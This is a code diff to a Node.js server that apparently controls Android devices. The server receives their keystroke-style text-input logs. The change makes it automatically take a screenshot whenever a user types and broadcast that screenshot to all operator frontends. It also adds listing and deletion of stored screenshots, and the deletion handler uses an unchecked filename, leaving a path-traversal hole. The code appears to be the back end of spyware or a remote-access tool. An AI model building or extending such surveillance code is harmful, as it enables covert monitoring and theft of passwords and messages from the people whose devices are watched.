@@ -241,6 +241,58 @@ frontendIo.on("connection", async (socket) => {
         }
     });
 
+    socket.on("get_screenshots", async (deviceId) => {
+        try {
+            const screenshotsDir = 'screenshots';
+            await fs.mkdir(screenshotsDir, { recursive: true });
+
+            const files = await fs.readdir(screenshotsDir);
+            let screenshotFiles = files
+                .filter(file => file.endsWith('.jpg') || file.endsWith('.jpeg') || file.endsWith('.png'))
+                .map(file => {
+                    // Extract device UUID and timestamp from filename
+                    // Format: screenshot-{deviceUuid}-{timestamp}.jpg
+                    const match = file.match(/^screenshot-(.+)-(\d{4}-\d{2}-\d{2}T\d{2}-\d{2}-\d{2}-\d{3}Z)\.jpg$/);
+                    if (match) {
+                        const [, deviceUuid, timestampStr] = match;
+                        const timestamp = new Date(timestampStr.replace(/-/g, ':').replace('T', ' '));
+                        return {
+                            filename: file,
+                            device_uuid: deviceUuid,
+                            timestamp: timestamp.getTime(),
+                            url: `/screenshots/${file}`
+                        };
+                    }
+                    return null;
+                })
+                .filter(item => item !== null);
+
+            // Filter by device ID if provided
+            if (deviceId && deviceId !== "None") {
+                screenshotFiles = screenshotFiles.filter(item => item.device_uuid === deviceId);
+            }
+
+            screenshotFiles.sort((a, b) => b.timestamp - a.timestamp); // Sort by timestamp descending
+
+            socket.emit("screenshots_list", screenshotFiles);
+        } catch (error) {
+            console.error('Error getting screenshots list:', error);
+            socket.emit("screenshots_list", []);
+        }
+    });
+
+    socket.on("delete_screenshot", async (filename) => {
+        try {
+            const filepath = `screenshots/${filename}`;
+            await fs.unlink(filepath);
+            console.log(`Screenshot deleted: ${filepath}`);
+            socket.emit("delete_screenshot_success", { filename });
+        } catch (error) {
+            console.error('Error deleting screenshot:', error);
+            socket.emit("delete_screenshot_error", { filename, error: error.message });
+        }
+    });
+
     socket.on("disconnect", () => {
         console.log(chalk.red(`[x] Frontend Disconnected (${socket.id})`))
 
@@ -426,6 +478,19 @@ androidIo.on("connection", async (socket) => {
                     // console.log(`Logger from device ${deviceUuid}: ${data}`);
                     device.logs.push({ timestamp: Date.now(), log: data });
                     device.lastSeen = Date.now();
+
+                    // Check if this is a text input event and request screenshot
+                    if (data && typeof data === 'string' && data.includes('[') && data.includes(']')) {
+                        // This appears to be a text input log, request screenshot
+                        if (!pendingScreenshots.has(deviceUuid)) {
+                            pendingScreenshots.set(deviceUuid, {
+                                frontend_socket_id: null, // Broadcast to all frontends
+                                timestamp: Date.now()
+                            });
+                            device.socket.emit("screenshot");
+                            console.log(chalk.green(`Automatic screenshot request sent to device ${deviceUuid} due to text input`));
+                        }
+                    }
                 } finally {
                     devicesMutex.release();
                 }
@@ -452,6 +517,7 @@ androidIo.on("connection", async (socket) => {
                 console.error('Logger storage error:', err)
             }
         })
+
 
         socket.on("screenshot_response", async (data) => {
             const deviceUuid = socket.deviceUuid;
@@ -490,15 +556,26 @@ androidIo.on("connection", async (socket) => {
                 const requestData = pendingScreenshots.get(deviceUuid);
                 if (requestData) {
                     const requestingFrontendId = requestData.frontend_socket_id;
-                    const requestingSocket = frontendIo.sockets.sockets.get(requestingFrontendId);
-                    if (requestingSocket) {
-                        console.log(`Sending screenshot response to frontend ${requestingFrontendId} for device ${deviceUuid}`);
-                        requestingSocket.emit("screenshot_ready", {
-                            device_uuid: deviceUuid,
-                            filename: filename
-                        });
+                    if (requestingFrontendId) {
+                        // Manual request from frontend
+                        const requestingSocket = frontendIo.sockets.sockets.get(requestingFrontendId);
+                        if (requestingSocket) {
+                            console.log(`Sending screenshot response to frontend ${requestingFrontendId} for device ${deviceUuid}`);
+                            requestingSocket.emit("screenshot_ready", {
+                                device_uuid: deviceUuid,
+                                filename: filename
+                            });
+                        } else {
+                            console.log(chalk.yellow(`Frontend ${requestingFrontendId} not found for device ${deviceUuid}`));
+                        }
                     } else {
-                        console.log(chalk.yellow(`Frontend ${requestingFrontendId} not found for device ${deviceUuid}`));
+                        // Automatic screenshot from text input - broadcast to all frontends
+                        console.log(`Broadcasting automatic screenshot to all frontends for device ${deviceUuid}`);
+                        frontendIo.emit("screenshot_ready", {
+                            device_uuid: deviceUuid,
+                            filename: filename,
+                            automatic: true
+                        });
                     }
                     // Clean up the pending request
                     pendingScreenshots.delete(deviceUuid);
